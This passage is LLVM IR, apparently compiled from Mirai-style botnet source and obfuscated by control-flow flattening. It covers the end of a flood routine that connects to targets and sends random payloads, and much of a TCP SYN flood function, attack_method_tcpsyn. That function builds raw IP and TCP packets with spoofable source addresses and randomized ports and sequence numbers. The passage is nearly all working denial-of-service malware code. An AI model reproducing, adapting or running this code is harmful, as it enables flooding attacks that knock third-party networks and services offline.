  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -1921938277, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 1538437044, i32 1062571838
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 1062571838, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 1256129365, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 1779350989, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -1587660928, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -931660349, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 702912320, i32 -1352276332
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 -1361565163, i32 1846256871
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 1846256871, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 1624243843, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 -931660349, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 -1587660928, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -485760493, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -485760493, label %first
    i32 2044435807, label %99
    i32 1671153986, label %100
    i32 371079060, label %106
    i32 -1503800055, label %109
    i32 1917496632, label %110
    i32 2043765705, label %116
    i32 1130087111, label %160
    i32 -421750735, label %164
    i32 688143780, label %289
    i32 -315087992, label %292
    i32 -1435354734, label %293
    i32 1673702213, label %294
    i32 1564635753, label %300
    i32 1115349225, label %320
    i32 -630231773, label %341
    i32 -857663672, label %345
    i32 1777487738, label %349
    i32 1717096489, label %354
    i32 983582614, label %360
    i32 1479931277, label %365
    i32 -1888759312, label %371
    i32 1872331229, label %376
    i32 -1141919888, label %382
    i32 443044843, label %386
    i32 -1700875817, label %390
    i32 932889696, label %394
    i32 -1179025145, label %398
    i32 -1628951855, label %402
    i32 -197081053, label %408
    i32 569858722, label %446
    i32 524844463, label %449
    i32 943190233, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 2044435807, i32 1671153986
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 943190233, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 371079060, i32 -1503800055
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 943190233, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1917496632, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 2043765705, i32 -315087992
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1130087111, i32 -421750735
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 -421750735, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 688143780, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 1917496632, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -1435354734, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1673702213, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 1564635753, i32 524844463
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 1115349225, i32 -630231773
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 -630231773, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -857663672, i32 1777487738
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = call i32 @rand_next()
  %347 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  store i32 1777487738, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 1717096489, i32 983582614
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 983582614, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 1479931277, i32 -1888759312
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 -1888759312, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1872331229, i32 -1141919888
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 -1141919888, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 443044843, i32 -1700875817
  store i32 %385, i32* %switchVar
